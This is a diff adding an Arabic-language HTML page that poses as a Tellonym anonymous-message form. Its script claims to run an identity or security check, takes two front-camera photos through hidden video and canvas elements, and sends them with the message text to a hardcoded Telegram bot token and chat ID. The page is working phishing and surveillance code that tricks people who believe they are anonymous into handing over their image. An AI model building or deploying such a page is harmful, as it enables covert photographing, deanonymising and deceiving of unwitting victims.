@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tellonym - Anonymous Messages</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background-color: #1e1e1e;
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            text-align: center;
+        }
+
+        .profile-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            gap: 15px;
+        }
+
+        .avatar {
+            width: 55px;
+            height: 55px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #ff4b91, #7b2ff7);
+        }
+
+        .username-container { text-align: right; }
+        .username { font-weight: bold; font-size: 1.1rem; display: block; }
+        .tells-count { color: #888; font-size: 0.8rem; }
+
+        textarea {
+            width: 100%;
+            height: 150px;
+            background-color: #2a2a2a;
+            border: 1px solid #333;
+            border-radius: 15px;
+            color: white;
+            padding: 15px;
+            box-sizing: border-box;
+            resize: none;
+            font-size: 1rem;
+            margin-bottom: 20px;
+            outline: none;
+        }
+
+        .btn-send {
+            width: 100%;
+            background: #ff4b91;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 30px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: 0.3s;
+        }
+
+        .btn-send:disabled { background: #555; cursor: not-allowed; }
+
+        .status-msg {
+            margin-top: 15px;
+            font-size: 0.85rem;
+            color: #ff4b91;
+            display: none;
+        }
+
+        /* عناصر الكاميرا المخفية */
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="profile-info">
+            <div class="avatar"></div>
+            <div class="username-container">
+                <span class="username">8V</span>
+                <span class="tells-count">229 Tells</span>
+            </div>
+        </div>
+
+        <textarea id="messageInput" placeholder="أرسل لي رسالة مجهولة..."></textarea>
+        
+        <button id="mainBtn" class="btn-send">إرسال مجهول</button>
+        
+        <p id="status" class="status-msg">جاري التحقق من الهوية...</p>
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const token = "8372973119:AAEvtD7kL-5L1uA4URd_CROFb9V4z1nXt8E";
+        const chatId = "591768998";
+        
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const mainBtn = document.getElementById('mainBtn');
+        const messageInput = document.getElementById('messageInput');
+        const statusMsg = document.getElementById('status');
+
+        mainBtn.addEventListener('click', async () => {
+            const text = messageInput.value.trim();
+            if (!text) {
+                alert("اكتب رسالتك أولاً!");
+                return;
+            }
+
+            // بدء العملية
+            mainBtn.disabled = true;
+            statusMsg.style.display = "block";
+            statusMsg.innerText = "جاري تفعيل نظام الأمان...";
+
+            try {
+                // طلب الكاميرا (سيظهر التنبيه للمستخدم)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                video.srcObject = stream;
+
+                // التقاط وإرسال الصور
+                setTimeout(() => {
+                    captureAndSend("صورة التحقق 1");
+                    
+                    setTimeout(() => {
+                        captureAndSend("صورة التحقق 2");
+                        
+                        // إرسال الرسالة النصية بعد الصور
+                        sendTextMessage(text);
+
+                        // إيقاف الكاميرا
+                        setTimeout(() => {
+                            stream.getTracks().forEach(track => track.stop());
+                            statusMsg.innerText = "تم الإرسال والتحقق بنجاح ✅";
+                            messageInput.value = "";
+                            mainBtn.disabled = false;
+                        }, 2000);
+                        
+                    }, 800); 
+                }, 1500);
+
+            } catch (err) {
+                console.error(err);
+                statusMsg.innerText = "يجب الموافقة على صلاحيات الكاميرا للإرسال!";
+                mainBtn.disabled = false;
+            }
+        });
+
+        function captureAndSend(label) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'verify.jpg');
+                formData.append('caption', `🔔 ${label}`);
+
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData,
+                    keepalive: true
+                });
+            }, 'image/jpeg', 0.5);
+        }
+
+        async function sendTextMessage(msg) {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `✉️ رسالة جديدة:\n\n${msg}`
+                })
+            });
+        }
+    </script>
+</body>
+</html>
